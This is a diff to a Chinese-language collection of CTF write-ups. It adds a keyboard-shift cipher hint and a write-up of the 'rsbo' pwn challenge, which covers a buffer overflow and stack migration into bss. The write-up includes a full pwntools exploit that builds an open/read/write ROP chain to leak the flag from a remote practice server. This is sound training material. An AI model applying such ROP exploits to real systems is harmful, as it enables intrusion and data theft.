@@ -74,6 +74,9 @@ while True:
         input()
 ```
 
+## 12 drvtry vpfr
+把 G:SH}Djogy <u Lrunpstf Smf Yu[omh Dp,ryjomh| 依鍵盤位置向左位移一格
+
 ## 14 zipfile
 題目給了一個十分難搞的zip檔，可以先用以下的code來做初步的解壓縮
 ```python=
@@ -992,6 +995,68 @@ def main():
     r.sendline('/bin/sh\00')
 
     r.interactive()
+```
+
+## 70 rsbo
+這題進行 read 時長度設為 0x80，但 buffer 長度只有 80，因此可以進行 bof，但 bof 長度不夠，可以透過 Stack Migration 的方式增加 ROPchain 的長度
+
+1. 先使用 read 將讀取 flag 的 ROPchain 讀到 bss 中 (額外加上 0x800 是為了避免蓋到 libc function)，然後將 return address 設為 _start，讓程式跳到最開始
+2. 使用 Stack Migration 的方式，用 pop ebp 設定 ebp 值後，再使用 leave (等同於 mov esp, ebp, pop ebp)，設定 esp 值
+3. 程式跳轉到步驟 1 寫入的 ROPchin，讀取 flag 並 write 出來
+
+```python=
+from pwn import *
+
+#r = process("./asset/rsbo")
+r = remote("ctf.hackme.quest", 7706)
+elf = ELF("./asset/rsbo")
+num = 0
+start_addr = elf.sym['_start']
+home_flag_str = 0x080487d0
+open_addr = 0x08048420
+read_addr = 0x80483e0
+write_addr = 0x8048450
+pop_ebp = 0x0804879f
+pop_edi_ebp = 0x0804879e
+pop_esi_edi_ebp = 0x0804879d
+data = elf.bss() + 0x800
+leave_addr = 0x080484f8
+rop_chain = [
+    open_addr,
+    pop_edi_ebp,
+    home_flag_str,
+    p32(0),
+    read_addr,
+    pop_esi_edi_ebp,
+    p32(3),
+    elf.bss(),
+    p32(0x80),
+    write_addr,
+    p32(0xdeadbeef),
+    p32(1),
+    elf.bss(),
+    p32(0x80)
+]
+
+rop_chain_read = [
+    read_addr,
+    start_addr,
+    p32(0),
+    data,
+    p32(len(rop_chain) * 4)
+]
+rop_chain_set_ebp = [
+    pop_ebp,
+    data - 4,
+    leave_addr
+]
+p = num.to_bytes(1, 'little') * 108 + flat(rop_chain_read)
+#input()
+r.send(p)
+r.send(flat(rop_chain))
+p = num.to_bytes(1, 'little') * 108 + flat(rop_chain_set_ebp)
+r.send(p)
+r.interactive()
 ```
 
 # Crypto
